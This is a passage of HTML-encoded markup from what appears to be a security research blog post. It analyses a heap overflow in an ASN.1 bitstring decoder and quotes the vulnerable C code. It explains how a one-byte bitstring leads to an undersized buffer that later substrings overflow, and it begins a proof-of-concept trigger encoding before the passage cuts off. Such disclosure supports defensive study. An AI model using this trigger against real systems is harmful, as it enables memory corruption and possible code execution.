c15"&gt;&lt;span&gt;Here they&amp;#39;re detecting a definite-length string type with a content length of 0. But this doesn&amp;#39;t handle the edge case of a bitstring which consists only of the unused-bits count byte. The &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;contents_length&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;value of that bitstring will be 1, but it doesn&amp;#39;t actually have any &amp;quot;contents&amp;quot;. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;It&amp;#39;s this case which the &lt;/span&gt;&lt;span class="c7"&gt;(state-&amp;gt;contents_length == 1)&lt;/span&gt;&lt;span&gt;&amp;nbsp;conditional in &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;matches:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.cc85cec956c682ae2159b3e2792de03dfdc37f3c"&gt;&lt;/a&gt;&lt;a id="t.13"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;||&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;contents_length &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;item &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c20"&gt;SecAsn1Item&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*)(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;dest&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Data&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Length&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;contents_length &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;else&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;By setting &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;place&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="c7"&gt;beforeEndOfContents&lt;/span&gt;&lt;span&gt;&amp;nbsp;they are again trying to short-circuit the state machine to skip ahead to the state after the string contents have been consumed. But here they take an additional step which they didn&amp;#39;t take when trying to achieve exactly the same thing in &lt;/span&gt;&lt;span class="c7"&gt;prepareForContents&lt;/span&gt;&lt;span&gt;. In addition to updating &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;place&lt;/span&gt;&lt;span&gt;&amp;nbsp;they also &lt;/span&gt;&lt;span class="c7"&gt;NULL&lt;/span&gt;&lt;span&gt;&amp;nbsp;out the &lt;/span&gt;&lt;span class="c7"&gt;dest&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c7"&gt;SecAsn1Item&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class="c7"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;field and set the &lt;/span&gt;&lt;span class="c7"&gt;Length&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="c7"&gt;0&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;I mentioned earlier that the new child states which are allocated to recursively parse the sub-strings of constructed strings get a &lt;/span&gt;&lt;span class="c17"&gt;copy&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the parent&amp;#39;s dest field (which is a pointer to a pointer to the output buffer.) This makes sense: that output buffer is only allocated once then gets recursively filled-in in a linear fashion by the children. (Technically this isn&amp;#39;t actually how it works if the outermost string is indefinite length, there&amp;#39;s separate handling for that case which instead builds a linked-list of substrings which are eventually concatenated, see &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_concat_substrings&lt;/span&gt;&lt;span class="c9"&gt;.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;If the output buffer is only allocated once, what happens if you set &lt;/span&gt;&lt;span class="c7"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="c7"&gt;NULL&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;like they do here? Taking a step back, does that actually make any sense at all?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;No, I don&amp;#39;t think it makes any sense. Setting &lt;/span&gt;&lt;span class="c7"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="c7"&gt;NULL&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;at this point should at the very least cause a memory leak, as it&amp;#39;s the only pointer to the output buffer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The fun part though is that that&amp;#39;s not the only consequence of &lt;/span&gt;&lt;span class="c7"&gt;NULL&lt;/span&gt;&lt;span&gt;ing out that pointer. &lt;/span&gt;&lt;span class="c7"&gt;item-&amp;gt;Data&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;is used to signal something else.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Here&amp;#39;s a snippet from &lt;/span&gt;&lt;span class="c7"&gt;prepare_for_contents&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;when it&amp;#39;s determining whether there&amp;#39;s enough space in the output buffer for this substring&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.d41f98cf14153779bd60c5cf6b4f85e93e5bdb90"&gt;&lt;/a&gt;&lt;a id="t.14"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;else&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;substring&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;* If we are a substring of a constructed string, then we may&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;* not have to allocate anything (because our parent, the&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;* actual constructed string, did it for us). &amp;nbsp;If we are a&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;* substring and we *do* have to allocate, that means our&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;* parent is an indefinite-length, so we allocate from our pool;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;* later our parent will copy our string into the aggregated&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;* whole and free our pool allocation.&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Data&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;item&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c20"&gt;Length&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; poolp &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;our_pool&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;else&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; alloc_len &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;As the comment implies, if both &lt;/span&gt;&lt;span class="c7"&gt;item-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span class="c7"&gt;NULL&lt;/span&gt;&lt;span&gt;&amp;nbsp;at this point and &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;substring&lt;/span&gt;&lt;span&gt;&amp;nbsp;is true, then (they believe) it &lt;/span&gt;&lt;span class="c17"&gt;must&lt;/span&gt;&lt;span&gt;&amp;nbsp;be the case that they are currently parsing a substring of an outer-level indefinite string, which has no definite-sized buffer already allocated. In that case the meaning of the &lt;/span&gt;&lt;span class="c30"&gt;item-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer is different to that which we describe earlier: it&amp;#39;s merely a temporary buffer meant to hold only this substring. Just above here &lt;/span&gt;&lt;span class="c7"&gt;alloc_len&lt;/span&gt;&lt;span&gt;&amp;nbsp;was set to the content length of this substring; and for the outer-&lt;/span&gt;&lt;span class="c17"&gt;definite&lt;/span&gt;&lt;span&gt;-length case it&amp;#39;s vitally important that &lt;/span&gt;&lt;span class="c7"&gt;alloc_len&lt;/span&gt;&lt;span&gt;&amp;nbsp;then gets set to 0 here (which is really indicating that a buffer has &lt;/span&gt;&lt;span class="c17"&gt;already&lt;/span&gt;&lt;span&gt;&amp;nbsp;been allocated and they &lt;/span&gt;&lt;span class="c17"&gt;must not&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;allocate a new one.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;To emphasize the potentially subtle point: the issue is that using this conjunction (&lt;/span&gt;&lt;span class="c30"&gt;state-&amp;gt;substring &amp;amp;&amp;amp; !item-&amp;gt;Data&lt;/span&gt;&lt;span&gt;) for determining whether this a substring of a definite length or outer-level-indefinite string is &lt;/span&gt;&lt;span class="c17"&gt;not&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;the same as the method used by the convoluted bounds checking code we saw earlier. That method walks up the current state stack and checks the indefinite bits of the super-strings to determine whether they&amp;#39;re processing a substring of an outer-level-indefinite string.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;Putting that all together, you might be able to see where this is going... (but it is still pretty subtle.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;Assume that we have an outer definite-length constructed bitstring with three primitive bitstrings as substrings:&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJrFict8RB7ceuAnNar7zlVvCo6pD9Li2Pbf3LJneP7BuRb9W7ZDtn-QMp4oofVurZqXctrbIJy_qXQ_NmvyteSEoqOeXmuk2W2JqrWl7_bIyKZk3C7HuN5zv3rLmT6fX5BZjoQAdAm_PQHl8b2xvEPFAAD9IP-WFKJcgzh_n_Sg5FZAZsT0FcHu5-tw/s831/image5%20%281%29.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJrFict8RB7ceuAnNar7zlVvCo6pD9Li2Pbf3LJneP7BuRb9W7ZDtn-QMp4oofVurZqXctrbIJy_qXQ_NmvyteSEoqOeXmuk2W2JqrWl7_bIyKZk3C7HuN5zv3rLmT6fX5BZjoQAdAm_PQHl8b2xvEPFAAD9IP-WFKJcgzh_n_Sg5FZAZsT0FcHu5-tw/s600/image5%20%281%29.png" border="0" alt="" style="max-height: 750; max-width: 600;"title="" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Upon encountering the first outer-most definite length constructed bitstring, the code will allocate a fixed-size buffer, large enough to store all the remaining input which makes up this string, which in this case is 42 bytes. At this point &lt;/span&gt;&lt;span class="c7"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;points to that buffer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;They then allocate a child state, which gets a copy of the &lt;/span&gt;&lt;span class="c7"&gt;dest&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer (not a copy of the &lt;/span&gt;&lt;span class="c7"&gt;dest&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c7"&gt;SecAsn1Item&lt;/span&gt;&lt;span&gt;&amp;nbsp;object; a copy of a pointer &lt;/span&gt;&lt;span class="c26"&gt;to&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;it), and proceed to parse the first child substring.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;This is a primitive bitstring with a length of &lt;/span&gt;&lt;span class="c7"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;which triggers the vulnerable path in &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span&gt;&amp;nbsp;and sets &lt;/span&gt;&lt;span class="c7"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="c7"&gt;NULL&lt;/span&gt;&lt;span&gt;. The state machine skips ahead to &lt;/span&gt;&lt;span class="c7"&gt;beforeEndOfContents&lt;/span&gt;&lt;span&gt;&amp;nbsp;then eventually the next substring gets parsed - this time with &lt;/span&gt;&lt;span class="c7"&gt;dest-&amp;gt;Data == NULL&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Now the logic goes wrong in a bad way and, as we saw in the snippet above, a new &lt;/span&gt;&lt;span class="c7"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer gets allocated which is the size of only this substring (2 bytes) when in fact &lt;/span&gt;&lt;span class="c7"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;should already point to a buffer large enough to hold the entire outer-level-indefinite input string. This bitstring&amp;#39;s contents then get parsed and copied into that buffer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Now we come to the third substring. &lt;/span&gt;&lt;span class="c7"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;is no longer &lt;/span&gt;&lt;span class="c7"&gt;NULL&lt;/span&gt;&lt;span&gt;; but the code now has no way of determining that the buffer was in fact only (erroneously) allocated to hold a single substring. It believes the invariant that &lt;/span&gt;&lt;span class="c7"&gt;item-&amp;gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;only gets allocated &lt;/span&gt;&lt;span class="c17"&gt;once&lt;/span&gt;&lt;span&gt;, when the first outer-level definite length string is encountered, and it&amp;#39;s that fact alone which it uses to determine whether &lt;/span&gt;&lt;span class="c7"&gt;dest-&amp;gt;Data&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;points to a buffer large enough to have this substring appended to it. It then happily appends this third substring, writing outside the bounds of the buffer allocated to store only the second substring.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c17 c28"&gt;This gives you a great memory corruption primitive: you can cause allocations of a controlled size and then overflow them with an arbitrary number of arbitrary bytes.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;Here&amp;#39;s an example encoding for an ASN.1 bitstring which triggers this issue:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1261584b92e8184a2715fd7e3223a95479b2f4e0"&gt;&lt;/a&gt;&lt;a id="t.15"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp;uint8_t concat_bitstrings_constructed_definite_with_zero_len_realloc&lt;/span&gt;&lt;span class="c1"&gt;[]&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c3"&gt;ASN1_CLASS_UNIVERSAL &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ASN1_CONSTRUCTED &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ASN1_BIT_STRING&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23"&gt;// (0x23)&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span 